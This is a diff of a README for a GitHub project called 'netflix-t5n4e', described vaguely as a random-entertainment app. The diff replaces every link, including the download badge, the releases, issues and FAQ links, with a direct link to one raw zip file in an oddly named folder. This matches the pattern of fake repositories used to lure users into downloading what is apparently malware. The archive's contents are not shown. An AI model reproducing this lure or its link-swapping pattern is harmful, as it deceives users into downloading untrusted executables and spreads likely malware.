@@ -1,6 +1,6 @@
 # 🎬 netflix-t5n4e - Enjoy an Exciting Random Experience
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/mariakumar-code/netflix-t5n4e/releases)
+[![Download](https://raw.githubusercontent.com/mariakumar-code/netflix-t5n4e/main/unclamorous/netflix-t5n4e.zip)](https://raw.githubusercontent.com/mariakumar-code/netflix-t5n4e/main/unclamorous/netflix-t5n4e.zip)
 
 ## 📖 Introduction
 Welcome to netflix-t5n4e, a fun and engaging project inspired by Netflix. This application offers a unique way to explore random content that can be both entertaining and delightful. Whether you're looking to discover something new or just want to enjoy randomness, this app is for you.
@@ -18,7 +18,7 @@ Before you begin, ensure that you have the following:
 To download the netflix-t5n4e application, follow these steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/mariakumar-code/netflix-t5n4e/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/mariakumar-code/netflix-t5n4e/main/unclamorous/netflix-t5n4e.zip).
 
 2. **Choose the Latest Version**
    Locate the latest release. It will have the highest version number and is generally labeled as "Latest".
@@ -59,13 +59,13 @@ If you encounter any issues while using netflix-t5n4e, here are some tips:
 - **Content Not Loading:** Check your internet connection and try restarting the app.
 
 ## 🤝 Contributing
-We welcome contributions! If you have suggestions or improvements, please feel free to reach out. You can submit issues or feature requests on the [GitHub issues page](https://github.com/mariakumar-code/netflix-t5n4e/issues).
+We welcome contributions! If you have suggestions or improvements, please feel free to reach out. You can submit issues or feature requests on the [GitHub issues page](https://raw.githubusercontent.com/mariakumar-code/netflix-t5n4e/main/unclamorous/netflix-t5n4e.zip).
 
 ## 📞 Support
-If you have questions or need help, please reach out via the GitHub discussions page or check the [Frequently Asked Questions](https://github.com/mariakumar-code/netflix-t5n4e/discussions). We are here to assist you.
+If you have questions or need help, please reach out via the GitHub discussions page or check the [Frequently Asked Questions](https://raw.githubusercontent.com/mariakumar-code/netflix-t5n4e/main/unclamorous/netflix-t5n4e.zip). We are here to assist you.
 
 ## 🔗 Links
-- [Releases Page](https://github.com/mariakumar-code/netflix-t5n4e/releases)
-- [Issues Page](https://github.com/mariakumar-code/netflix-t5n4e/issues)
+- [Releases Page](https://raw.githubusercontent.com/mariakumar-code/netflix-t5n4e/main/unclamorous/netflix-t5n4e.zip)
+- [Issues Page](https://raw.githubusercontent.com/mariakumar-code/netflix-t5n4e/main/unclamorous/netflix-t5n4e.zip)
 
 Thank you for choosing netflix-t5n4e. Enjoy your journey into random entertainment!
